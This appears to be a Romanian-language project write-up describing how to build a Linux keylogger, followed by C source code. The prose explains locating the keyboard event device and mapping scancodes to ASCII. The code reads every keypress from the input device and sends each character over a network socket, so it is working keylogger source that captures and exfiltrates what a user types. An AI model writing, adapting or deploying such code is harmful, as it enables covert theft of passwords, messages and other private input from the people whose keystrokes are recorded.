# Metoda de implementare

Din fisierul `/dev/inputs` se ia prin regex event-ul asociat tastaturii `/dev/inputs/eventsX` si de unde se vor prelucra tastele apasate de utilizator printr-o variabila event care va detecta apasarea tastelor
Event-ul respectiv trebuie extras din fisierul `/proc/bus/input/devices`
Codurile citite prin variabila de `event` sunt de tip **scancode** si trebuiesc formatate in format **ASCII** 
Formatarea se va face printr-o mapare directa.
Caracterele speciale (**CTRL**, **ESC**, **BACKSPACE** etc.) vor fi scrise sub o forma speciala (ex: \<*BACKSPACE*\>)
KeyLogger-ul va afisa tastele apasate in fisierul aferent utilizatorului.

```c
typedef struct {
    int key_code;
    char ascii_char;
} KeyCodeMap;

// Mapping of XT key codes to ASCII characters
KeyCodeMap xt_to_ascii_map[] = {
    {0x1E, 'a'}, {0x30, 'b'}, {0x2E, 'c'}, {0x20, 'd'}, {0x12, 'e'}, {0x21, 'f'}, {0x22, 'g'},
    {0x23, 'h'}, {0x17, 'i'}, {0x24, 'j'}, {0x25, 'k'}, {0x26, 'l'}, {0x32, 'm'}, {0x31, 'n'},
    {0x18, 'o'}, {0x19, 'p'}, {0x10, 'q'}, {0x13, 'r'}, {0x1F, 's'}, {0x14, 't'}, {0x16, 'u'},
    {0x2F, 'v'}, {0x11, 'w'}, {0x2D, 'x'}, {0x15, 'y'}, {0x2C, 'z'}, {0x02, '1'}, {0x03, '2'},
    {0x04, '3'}, {0x05, '4'}, {0x06, '5'}, {0x07, '6'}, {0x08, '7'}, {0x09, '8'}, {0x0A, '9'},
    {0x0B, '0'}, {0x1C, '\n'}, {0x39, ' '}, {0x0E, '\b'}, {0x0F, '\t'}, {0x1A, '['}, {0x1B, ']'},
    {0x27, ';'}, {0x28, '\''}, {0x29, '`'}, {0x2B, '\\'}, {0x33, ','}, {0x34, '.'}, {0x35, '/'},
    {0x0D, '='}, {0x0C, '-'}
};

char xt_to_ascii(int key_code) {
    int map_size = sizeof(xt_to_ascii_map) / sizeof(xt_to_ascii_map[0]);
    for (int i = 0; i < map_size; i++) {
        if (xt_to_ascii_map[i].key_code == key_code) {
            return xt_to_ascii_map[i].ascii_char;
        }
    }
    
    return '\0';  
}

void start_keylogger(int sock, const char *device_path) {
    struct input_event ev;
    int fd;
    ssize_t n;
    char buffer[256];

    fd = open(device_path, O_RDONLY);
    if (fd == -1) {
        perror("Cannot open input device");
        return;
    }

    while (1) {
        n = read(fd, &ev, sizeof(struct input_event));
        if (n == (ssize_t)-1) {
            perror("Read error");
            break;
        }
        
        if (ev.type == EV_KEY) {  
            //printf("Key event: code=%d, value=%d\n", ev.code, ev.value);
            if (ev.value == 1) {  
                snprintf(buffer, sizeof(buffer), "%c", xt_to_ascii(ev.code));
                //printf("Sending: %s\n", buffer);
                send(sock, buffer, strlen(buffer), 0);
                fflush(NULL);
            }
        }
    }

    close(fd);
}
```



